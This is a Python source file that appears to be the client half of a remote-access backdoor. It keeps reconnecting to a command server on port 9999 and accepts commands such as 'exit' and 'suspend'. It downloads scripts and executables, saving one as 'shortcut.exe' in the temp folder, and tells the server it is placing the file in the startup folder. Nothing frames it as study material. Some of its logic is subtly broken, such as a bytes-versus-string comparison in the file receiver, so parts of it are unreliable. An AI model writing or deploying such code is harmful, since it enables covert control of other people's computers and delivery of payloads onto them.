import socket
from threading import Thread
import time
import tempfile
import os

success = False
command = 'rem.'
flag2 = True


def connect():
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 9999))
        return True
    except ConnectionRefusedError:
        return False


def tryAgain():
    # print('Establishing connection')
    time.sleep(1)
    global success, re, flag2, command
    while not success:
        # print('Retrying...')
        success = connect()
        time.sleep(1)

    if re:
        if not re.is_alive():
            re = Thread(target=rec)
            re.start()
    success = False
    flag2 = True
    command = 'rem.'


def send(msgs) -> None:
    if msgs:
        msgs = msgs.encode()
        s.send(msgs)


def sendImg(imgs):
    if imgs:
        s.send(imgs)


def process(*flag):
    global command, flag2
    if flag:
        flag2 = flag[0]
    return command, flag2


def saveScript(type):
    if type != b'SCRIPY' and type != b'SCRIPB':
        s.send(f'\r[*] The host has received the file. Uploading in startup folder!'.encode())
    temp_dir = tempfile.gettempdir()
    filename = 'script.txt' if type == b'SCRIPT' else 'shortcut.exe'
    w = 'w' if type == b'SCRIPT' else 'wb'
    script_path = os.path.join(temp_dir, filename)

    with open(script_path, w) as p:
        while True:
            script = s.recv(1024).decode() if type == b'SCRIPT' else s.recv(1024)
            if b'# ENDOFFILE' in script:
                break
            p.write(script)

        p.close()
    return script_path


def rec() -> None:
    retry = Thread(target=tryAgain)
    global success, command
    while True:
        try:
            header = s.recv(6)

            if header and header != b'SCRIPY' and header != b'SCRIPB' and header != b'FILE||':
                r_msg = s.recv(1024)
                r_msg = r_msg.decode()
                if r_msg:

                    command = r_msg
                    process(True)

                    if r_msg == 'exit':
                        break

                    elif r_msg == 'suspend':
                        s.settimeout(0)
            else:
                scriptPath = saveScript(header)
                command = f'{header.decode()}|{scriptPath}'
                process(True)

        except (ConnectionResetError, OSError, TimeoutError):

            if not retry.is_alive():
                retry.start()
                break


re = Thread(target=rec)
tryAgain()
# print(f'connected to the terminal!')

if __name__ == '__main__':
    while True:
        msg = input('enter: ')
        send(msg)


